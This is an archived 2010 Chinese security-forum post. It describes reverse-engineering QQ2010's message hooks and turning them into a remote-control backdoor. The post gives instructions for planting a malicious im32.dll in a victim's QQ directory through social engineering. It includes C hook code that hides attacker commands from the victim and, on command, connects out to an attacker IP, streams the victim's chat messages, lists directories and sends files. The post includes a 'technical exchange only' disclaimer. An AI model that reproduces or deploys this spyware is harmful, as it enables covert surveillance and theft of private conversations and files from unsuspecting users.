
# 利用 qq2010 聊天信息获取，打造自己的远程控制

> 原文：[`www.pediy.com/kssd/pediy11/121037.html`](https://www.pediy.com/kssd/pediy11/121037.html)

标题:【原创】利用 `qq2010` 聊天信息获取，打造自己的远程控制

作者:踏雪流云

日期:2010 年 9 月 24 号

声明:本文章的目的仅为技术交流讨论

前些天，小弟通过逆向 `QQSpy`，侥幸成功实现 `QQ2010` 聊天信息获取，参见原文：[`bbs.pediy.com/showthread.php?t=119659`](http://bbs.pediy.com/showthread.php?t=119659)

后来，小弟有一天闲来无事，对此又进行了一下深入一点的研究。

首先，将上文中的附件 `im32.dll` 和 `msimg32.dll` 放入 `QQ` 的 `Bin` 目录下，用 `OD` 加载 `im32.dll`，在 `Hook_SaveMsg` 的函数中设置断点；然后，加载 `QQ`，运行后，给此 `QQ` 发送一条消息，便命中断点于 `Hook_SaveMsg` 函数中，`Ctrl+F9`，便来到如下位置：

代码:

```
3119CBCD    FF15 6CA92A31   call    dword ptr [<&KernelUtil.Util::Co>; KernelUt.Util::Contact::GetSelfUin
3119CBD3    50              push    eax
3119CBD4    68 10542B31     push    312B5410                     ; UNICODE "buddy"
3119CBD9    FF15 C4A72A31   call    dword ptr [<&KernelUtil.Util::Ms>; KernelUt.Util::Msg::SaveMsg
3119CBDF    8B45 EC         mov     eax, dword ptr [ebp-14]
3119CBE2    83C4 18         add     esp, 18
3119CBE5    3BC3            cmp     eax, ebx
3119CBE7    885D FC         mov     byte ptr [ebp-4], bl
3119CBEA    74 08           je      short 3119CBF4
```

再 `Ctrl+F9`，便来到如下位置：

代码:

```
3116B922    8B45 F0         mov     eax, dword ptr [ebp-10]
3116B925    8B48 0C         mov     ecx, dword ptr [eax+C]
3116B928    51              push    ecx
3116B929    FF15 58A82A31   call    dword ptr [<&KernelUtil.Util::Co>; KernelUt.Util::Contact::IsPrevented
3116B92F    83C4 04         add     esp, 4
3116B932    85C0            test    eax, eax
3116B934    0F85 44010000   jnz     3116BA7E
3116B93A    50              push    eax
3116B93B    8D55 D0         lea     edx, dword ptr [ebp-30]
```

当看到 `KernelUt.Util::Contact::IsPrevented` 这个导出函数时，感觉这个函数应该是用来判断是否屏蔽某人对自己的消息的（因为 `QQ` 有一个功能是屏蔽此人消息）；通过调试，果如其然，这个 `IsPrevented` 函数的参数就是对方的 `QQ` 号码，返回值为 `BOOL` 值；单步调试过此函数后，将 `eax` 的零改为一，就不显示接收到此人消息了。。。

由此引发的联想是，如果我利用 `qq` 聊天窗口向对方发送命令，岂不可以达到远程控制的目的？

具体流程如下：

1. 将此 `im32.dll` 文件放入对方 `Bin` 目录下，社会工程学的东西。
2. 对方运行加载了此 `im32.dll` 的 `QQ` 后，可以给对方发送命令，达到远程控制的目的。

如：

- `-cmd ip 127.0.0.1` //给对方发送自己的 `ip` 地址；此时，`im32.dll` 会使用 `UDP` 连接此 `ip`。
- `-cmd msg` //实时发送聊天信息给对方。
- `-cmd dir D:\*.*` //枚举某一目录下的所有文件，并发给对方。
- `-cmd file D:\123.txt` //发送某文件给对方。

更多的功能可以自己添加。

实现代码如下：

代码:

```
HANDLE Hook_SaveMsg(wchar_t const * str, unsigned long dstqq, unsigned long srcqq, unsigned long data3,
              struct ITXMsgPack * pmsg, struct ITXData * pdata)
{
  bCmd=FALSE;
  wchar_t * msg=NULL;
  AbstractMsg((struct ITXMsgPack *)&msg,(DWORD)pmsg);//获取聊天信息
  if(srcqq==QQ)//判断是否是对方 QQ 号码
  {
    if(msg[0]=='-'&&msg[1]=='c'&&msg[2]=='m'&&msg[3]=='d')//-cmd，判断是否是命令
    {
      bCmd=TRUE;//标记是命令
      ExecuteCmd(&msg[5]);//命令处理
      return 0;//如果是命令，就不 SaveMsg，即不保存聊天信息，直接返回
    }
  }
  if(nSendType==1)
  {
    SendMsg(msg,dstqq,srcqq);//实时发送聊天信息给对方
  }

  ChookSaveMsgKey->HookStatus(FALSE);
    (MsgSave)SaveMsg(str,dstqq,srcqq,data3,pmsg,pdata);//保存聊天信息
  ChookSaveMsgKey->HookStatus(TRUE);

  return 0;
}

int Hook_IsPrevented(unsigned long qq)
{
  if(qq==QQ&&bCmd)//如果 QQ 号码是对方，并且发送的是命令
  {
    bCmd=FALSE;//清空标记
    return 1;//返回 1，即屏蔽此人消息，这样本方就不会提示收到此信息了，达到利用 qq 聊天窗口作为命令窗口的目的
  }

  ChookIsPreventedKey->HookStatus(FALSE);
    (IsPrevented)IsOldrevented(qq);
  ChookIsPreventedKey->HookStatus(TRUE);

  return 0;
}

void ExecuteCmd(wchar_t * cmdkey)
{
  //Unicode 编码转换为 Multi-Byte 编码
  int len = WideCharToMultiByte(CP_ACP, 0, cmdkey, wcslen(cmdkey), NULL, 0, NULL, NULL);
  char * buffer = new char[len + 1];
  WideCharToMultiByte(CP_ACP, 0, cmdkey, wcslen(cmdkey), buffer, len, NULL, NULL);
  buffer[len] = '\0';
  if(buffer[0]=='i'&&buffer[1]=='p')//ip
  {
    ConnectServer(&buffer[3]);
  }
  else if(buffer[0]=='b'&&buffer[1]=='o'&&buffer[2]=='x')//box
  {
    ShowMessageBox(&buffer[4]);
  }
  else if(buffer[0]=='m'&&buffer[1]=='s'&&buffer[2]=='g')//msg
  {
    nSendType=1;
  }
  else if(buffer[0]=='d'&&buffer[1]=='i'&&buffer[2]=='r')//dir
  {
    SendDir(&buffer[4]);
  }
  else if(buffer[0]=='f'&&buffer[1]=='i'&&buffer[2]=='l'&&buffer[3]=='e')//file
  {
    SendFile(&buffer[5]);
  }

  delete[] buffer;
}
```

源代码如下：

`im32.rar`

测试截图：

![](img/d3d6bbeb812a5ce0effc75e447513926.jpg)

此图是在本机测试，测试成功；远程测试，就依赖 `UDP` 连接了，我没有进行过远程测试。。。

因为只是测试，文件传输功能未优化（其实是不靠谱，自己懒得弄了，望有兴趣者完善之）。
